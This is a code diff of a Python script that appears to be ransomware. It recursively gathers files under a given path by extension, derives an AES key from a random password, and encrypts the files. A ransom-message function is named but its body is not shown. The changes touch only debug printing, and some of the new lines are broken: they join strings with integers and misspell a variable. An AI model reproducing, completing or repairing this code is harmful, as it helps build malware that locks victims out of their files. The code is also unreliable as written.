@@ -19,8 +19,8 @@ base_path = sys.argv[1]
 def Encrypt(fileToEncrypt, iv, aes_obj):
     file_size = str(os.path.getsize(fileToEncrypt)).zfill(16)
     encrypted = ""
-    print("original size")
-    print(file_size)
+    print("encrypting " + fileToEncrypt)
+    print("original size: " + os.path.getsize(fileToEncrypt))
     with open(fileToEncrypt, 'rb') as infile:
         encrypted = encrypted + file_size
         encrypted = encrypted + str(iv)
@@ -31,8 +31,7 @@ def Encrypt(fileToEncrypt, iv, aes_obj):
             elif len(chunk) % 16 != 0:
                 chunk += b' ' * (16 - (len(chunk) % 16))
             encrypted = encrypted + str(aes_obj.encrypt(chunk))
-    print("encrypted size")
-    print(len(encrypted))
+    print("encrypted size: " + len(encrypted))
     return encrypted
 
 def EncryptFile(fileToEncrypt, key):
@@ -59,8 +58,6 @@ def GetAllFiles(dirName):
         else:
             if fullPath.endswith(ext):
                 allFiles.append(fullPath)
-    print("count")
-    print(len(allFiles))
     return allFiles
 
 def WriteUserMessage():
@@ -74,6 +71,8 @@ def WriteUserMessage():
 
 def StartEncryption():
     files_to_encrypt = GetAllFiles(base_path)
+    print("files to encrypt")
+    print(len(file_to_encrypt))
     password = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(32))
     key = SHA256.new(password.encode('utf-8')).digest()
     EncryptAllFiles(files_to_encrypt, key)
